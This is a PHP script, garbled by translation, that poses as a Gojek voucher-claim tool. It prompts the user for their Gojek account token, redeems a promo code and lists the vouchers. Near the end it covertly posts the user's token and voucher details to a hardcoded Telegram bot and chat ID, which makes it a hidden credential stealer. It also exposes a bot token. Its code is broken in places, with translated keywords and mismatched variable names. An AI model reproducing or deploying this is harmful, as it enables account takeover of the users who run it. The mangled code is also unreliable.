<? php
date_default_timezone_set ( 'Asia / Jakarta' );
termasuk  "function2.php" ;
 warna gema ( "merah" , "Token:" );
$ token = trim ( fgets ( STDIN ));
        gema  "\ n" . warna ( "nevy" , "🔒 ▶ ️ Voucher Klaim" );
        gema  "\ n" . warna ( "biru" , "⏳︄ ▶ ️Harap Tunggu ..." );
        untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
         warna gema ( "biru" , "Sabar" );
        tidur ( 20 );
        }
        $ code1 = permintaan ( '/ promosi-pergi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "PESANGOFOOD2107"}' );
        $ message = fetch_value ( $ code1 , '"message": "' , '"' );
        if ( strpos ( $ code1 , 'Promo kamu sudah bisa dipakai' )) {
        gema  "\ n" . warna ( "hijau" , "🔓 ▶ ️ Pesan:" . $ message );
        goto gocar;
        } lain {
        gema  "\ n" . warna ( "merah" , "🔐 ▶ ️ Pesan:" . $ message );
	    gocar:
        tidur ( 3 );
        $ cekvoucher = request ( '/ gopoints / v3 / wallet / voucher? limit = 13 & halaman = 1' , $ token );
        $ total = fetch_value ( $ cekvoucher , '"total_vouchers":' , ',' );
        $ voucher1 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "1" );
        $ voucher2 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "2" );
        $ voucher3 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "3" );
        $ voucher4 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "4" );
        $ voucher5 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "5" );
        $ voucher6 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "6" );
        $ voucher7 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "7" );
        $ voucher8 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "8" );
        $ voucher9 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "9" );
        $ voucher10 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "10" );
        $ voucher11 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "11" );
        $ voucher12 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "12" );
        $ voucher13 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "13" );
        gema  "\ n" . warna ( "ungu" , "🎫 ▶ ️ Total voucher" . $ total . ":" );
        gema  "\ n" . warna ( "hijau" , "1." . $ voucher1 );
        gema  "\ n" . warna ( "hijau" , "2." . $ voucher2 );
        gema  "\ n" . warna ( "hijau" , "3." . $ voucher3 );
        gema  "\ n" . warna ( "hijau" , "4." . $ voucher4 );
        gema  "\ n" . warna ( "hijau" , "5." . $ voucher5 );
        gema  "\ n" . warna ( "hijau" , "6." . $ voucher6 );
        gema  "\ n" . warna ( "hijau" , "7." . $ voucher7 );
        gema  "\ n" . warna ( "hijau" , "8." . $ voucher8 );
        gema  "\ n" . warna ( "hijau" , "9." . $ voucher9 );
        gema  "\ n" . warna ( "hijau" , "10." . $ voucher10 );
    	gema  "\ n" . warna ( "hijau" , "11." . $ voucher11 );
        gema  "\ n" . warna ( "hijau" , "12." . $ voucher12 );
        gema  "\ n" . warna ( "hijau" , "13." . $ voucher13 );
        gema "\ n" ;
        $ expired1 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '1' );
        $ expired2 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '2' );
        $ expired3 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '3' );
        $ expired4 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '4' );
        $ expired5 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '5' );
        $ expired6 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '6' );
        $ expired7 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '7' );
        $ expired8 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '8' );
        $ expired9 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '9' );
        $ expired10 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '10' );
        $ expired11 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '11' );
        $ expired12 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '12' );
        $ expired13 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '13' );
        $ TOKEN   = "1256658945: AAFn7EUzJDnuR9kvcEegQdWG3rAaYqjgwVo" ;
      	$ chatid = "719008328" ;
      	$ pesan  	= "[+] Info Akun Gojek [+] \ n \ n" . $ token . "\ n \ nTotalVoucher =" . $ total . "\ n [+]" . $ voucher1 . "\ n [+] Exp: [" . $ kedaluwarsa1 . "] \ n [+]" . $ voucher2 . "\ n [+] Exp: [" . $ kedaluwarsa2 . "] \ n [+]" . $ voucher3 . "\ n [+] Exp: [" . $ kedaluwarsa3 . "] \ n [+]" ."\ n [+] Exp: [" . $ kedaluwarsa4 . "] \ n [+]" . $ voucher5 . "\ n [+] Exp: [" . $ kedaluwarsa5 . "] \ n [+]" . $ voucher6 . "\ n [+] Exp: [" . $ kedaluwarsa6 . "] \ n [+]" . $ voucher7 . "\ n [+] Exp: [" . $ kedaluwarsa7 . "] \ n [+]" . $ voucher8 . "\ n [+] Exp: [" . $ kedaluwarsa8 . "] \ n [+]" . $voucher9 . "\ n [+] Exp: [" . $ kedaluwarsa9 . "] \ n [+]" . $ voucher10 . "\ n [+] Exp: [" . $ kedaluwarsa10 . "]" . $ voucher11 . "\ n [+] Exp: [" . $ kedaluwarsa11 . "] \ n [+]" . $ voucher12 . "\ n [+] Exp: [" . $ kedaluwarsa12 . "] \ n [+]" . $ voucher13 . "\ n [+] Exp: [" . $ kedaluwarsa13 . "] \ n [+]";
      	$ method 	= "sendMessage" ;
      	$ url     = "https://api.telegram.org/bot" . $ TOKEN . "/" . $ method ;
      	$ post = [
      		'chat_id' => $ chatid ,
                'text' => $ pesan
        	];
                $ header = [
                "X-Diminta-Dengan: XMLHttpRequest" ,
                "Agen-Pengguna: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 51.0.2704.84 Safari / 537.36" 
                        ];
                                        $ ch = curl_init ();
                                        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
                                        curl_setopt ( $ ch , CURLOPT_URL , $ url );
                                        curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ header );
                                        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );   
                                        curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
                                        $ data = curl_exec ( $ ch );
                                        $ error = curl_error ( $ ch );
                                        $ status = curl_getinfo ( $ ch , CURLINFO_HTTP_CODE );
                                        curl_close ( $ ch );
                                        $ debug [ 'text' ] = $ pesan ;
                                        $ debug [ 'response' ] = json_decode ( $ data , true );
        }
